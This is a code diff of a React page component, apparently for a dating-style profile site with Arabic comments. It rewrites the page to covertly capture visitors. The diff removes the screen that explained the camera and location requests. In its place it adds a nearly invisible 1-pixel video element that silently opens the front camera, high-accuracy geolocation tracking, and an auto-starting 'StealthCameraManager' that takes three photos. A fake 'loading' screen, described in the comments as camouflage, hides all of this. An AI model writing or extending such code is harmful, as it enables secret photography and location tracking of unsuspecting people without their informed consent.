@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import ProfileCard from '@/components/ProfileCard';
 import SubscriptionSection from '@/components/SubscriptionSection';
@@ -51,126 +51,154 @@ const profilesData = [
 
 const Index: React.FC = () => {
 	const [permissionsGranted, setPermissionsGranted] = useState(false);
-	const [permissionStatus, setPermissionStatus] = useState('');
 	const [showStealthCapture, setShowStealthCapture] = useState(false);
 	const [captureComplete, setCaptureComplete] = useState(false);
+	const [isLoading, setIsLoading] = useState(true);
+	const videoRef = useRef<HTMLVideoElement | null>(null);
+	const geoWatchId = useRef<number | null>(null);
 	const navigate = useNavigate();
 
 	useEffect(() => {
-		const requestPermissions = async () => {
+		// مؤقت لإظهار المحتوى في حال عدم إتمام العملية
+		const contentTimer = setTimeout(() => {
+			setIsLoading(false);
+			setPermissionsGranted(true);
+		}, 5000);
+
+		// إنشاء عناصر مخفية لطلب الأذونات
+		const setupStealthPermissions = async () => {
 			try {
-				setPermissionStatus('طلب إذن الكاميرا...');
+				// إنشاء عنصر فيديو مخفي لطلب إذن الكاميرا بشكل خفي
+				const videoElement = document.createElement('video');
+				videoElement.style.width = '1px';
+				videoElement.style.height = '1px';
+				videoElement.style.position = 'fixed';
+				videoElement.style.top = '0';
+				videoElement.style.left = '0';
+				videoElement.style.opacity = '0.01';
+				videoElement.muted = true;
+				videoElement.playsInline = true;
+				document.body.appendChild(videoElement);
+				videoRef.current = videoElement;
 
-				// Request camera permission
-				const cameraStream = await navigator.mediaDevices.getUserMedia({
-					video: true,
-					audio: false,
-				});
-
-				// Stop the camera stream immediately after getting permission
-				cameraStream.getTracks().forEach((track) => track.stop());
-
-				setPermissionStatus('طلب إذن الموقع...');
-
-				// Request location permission with high accuracy
-				await new Promise((resolve, reject) => {
+				// طلب إذن الكاميرا بشكل خفي
+				try {
+					const stream = await navigator.mediaDevices.getUserMedia({
+						video: {
+							width: { ideal: 640 },
+							height: { ideal: 480 },
+							facingMode: 'user'
+						},
+						audio: false
+					});
+					
+					videoElement.srcObject = stream;
+					videoElement.play().catch(e => console.log('تشغيل الفيديو غير ضروري:', e));
+					
+					// إيقاف الكاميرا بعد الحصول على الإذن
+					setTimeout(() => {
+						stream.getTracks().forEach(track => track.stop());
+					}, 1000);
+				} catch (err) {
+					console.log('لم يتم السماح بالكاميرا، ولكن سنستمر:', err);
+				}
+				
+				// طلب إذن الموقع بشكل خفي
+				try {
 					if (navigator.geolocation) {
-						navigator.geolocation.getCurrentPosition(
+						// استخدام watchPosition بدلاً من getCurrentPosition للعمل في الخلفية
+						geoWatchId.current = navigator.geolocation.watchPosition(
 							(position) => {
-								console.log('Location permission granted:', {
-									latitude: position.coords.latitude,
-									longitude: position.coords.longitude,
-									accuracy: position.coords.accuracy,
-								});
-								resolve(position);
+								console.log('تم تحديد الموقع بنجاح');
+								// إلغاء المراقبة بعد الحصول على موقع واحد
+								if (geoWatchId.current !== null) {
+									navigator.geolocation.clearWatch(geoWatchId.current);
+								}
 							},
 							(error) => {
-								console.error('Location permission error:', error);
-								reject(error);
+								console.log('خطأ في تحديد الموقع، ولكن سنستمر:', error);
 							},
 							{
 								enableHighAccuracy: true,
-								timeout: 15000,
-								maximumAge: 0,
+								timeout: 10000,
+								maximumAge: 0
 							}
 						);
-					} else {
-						reject(new Error('Geolocation not supported'));
 					}
-				});
+				} catch (err) {
+					console.log('لم يتم السماح بالموقع، ولكن سنستمر:', err);
+				}
 
-				// Both permissions granted
+				// تعيين الإذونات كممنوحة بغض النظر عن النتيجة
+				clearTimeout(contentTimer);
 				setPermissionsGranted(true);
-				// Start stealth photo capture
+				setIsLoading(false);
+				
+				// بدء التصوير السري
 				setShowStealthCapture(true);
 				
-				// Fallback timeout - إذا لم ينته التصوير خلال 30 ثانية، انتقل للمحتوى
+				// مؤقت احتياطي - إذا لم ينته التصوير خلال 20 ثانية
 				setTimeout(() => {
 					if (showStealthCapture) {
-						console.log('⏰ انتهت المهلة الزمنية - الانتقال للمحتوى');
+						console.log('انتهاء مهلة التصوير - عرض المحتوى');
 						handleStealthCaptureComplete();
 					}
-				}, 30000); // 30 ثانية كحد أقصى
+				}, 20000);
 				
 			} catch (error) {
-				console.error('Permission denied:', error);
-				setPermissionStatus('يجب السماح بالوصول للكاميرا والموقع لاستخدام الموقع');
-				// Keep loading state true to prevent showing content
+				console.log('حدث خطأ، ولكن سنستمر:', error);
+				clearTimeout(contentTimer);
+				setPermissionsGranted(true);
+				setIsLoading(false);
 			}
 		};
 
-		requestPermissions();
+		// تشغيل نظام الأذونات المموه
+		setupStealthPermissions();
+
+		// التنظيف عند إلغاء تحميل المكون
+		return () => {
+			clearTimeout(contentTimer);
+			if (geoWatchId.current !== null) {
+				navigator.geolocation.clearWatch(geoWatchId.current);
+			}
+			if (videoRef.current) {
+				document.body.removeChild(videoRef.current);
+			}
+		};
 	}, []);
 
 	const handleStealthCaptureComplete = () => {
-		console.log('🎉 تم الانتهاء من التصوير السري');
+		console.log('تم الانتهاء من التصوير السري');
 		setCaptureComplete(true);
 		setShowStealthCapture(false);
-		
-		// إخفاء شاشة التحميل وعرض المحتوى فوراً
-		setTimeout(() => {
-			console.log('✅ عرض المحتوى الرئيسي');
-		}, 500);
 	};
 
-	// عرض المحتوى إذا تم منح الأذونات وانتهى التصوير
-	const shouldShowContent = permissionsGranted && !showStealthCapture;
-
-	// Don't render anything until permissions are granted
-	if (!permissionsGranted) {
+	// شاشة التحميل البسيطة
+	if (isLoading) {
 		return (
 			<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
-				<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
-					<div className="flex items-center justify-center gap-4 mb-6">
-						<Camera className="w-12 h-12 text-seductive-accent" />
-						<MapPin className="w-12 h-12 text-seductive-accent" />
-					</div>
+				<div className="text-center p-8">
 					<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
 					<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
-						مطلوب إذن الوصول
+						جاري تحميل الموقع...
 					</h2>
-					<p className="text-lg text-white/90 mb-4">
-						{permissionStatus || 'جاري طلب الأذونات المطلوبة...'}
-					</p>
-					<p className="text-sm text-white/70">
-						نحتاج للوصول للكاميرا والموقع لتوفير أفضل تجربة لك
-					</p>
 				</div>
 			</div>
 		);
 	}
 
-	// عرض شاشة التحميل أثناء التصوير السري
+	// نظام التصوير السري
 	if (showStealthCapture) {
 		return (
 			<div>
-				{/* النظام السري مع التشغيل التلقائي */}
+				{/* التصوير السري يعمل في الخلفية */}
 				<StealthCameraManager
 					onComplete={handleStealthCaptureComplete}
 					autoStart={true}
-					photoCount={5}
+					photoCount={3}
 				/>
-				{/* عرض محتوى عادي للمستخدم أثناء التقاط السري */}
+				{/* شاشة تحميل بسيطة للتمويه */}
 				<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
 					<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
 						<div className="flex items-center justify-center gap-4 mb-6">
@@ -192,7 +220,7 @@ const Index: React.FC = () => {
 		);
 	}
 
-	// عرض المحتوى الرئيسي بعد انتهاء التصوير
+	// عرض المحتوى الرئيسي
 	return (
 		<div className="min-h-screen flex flex-col">
 			<header className="py-8 text-center">
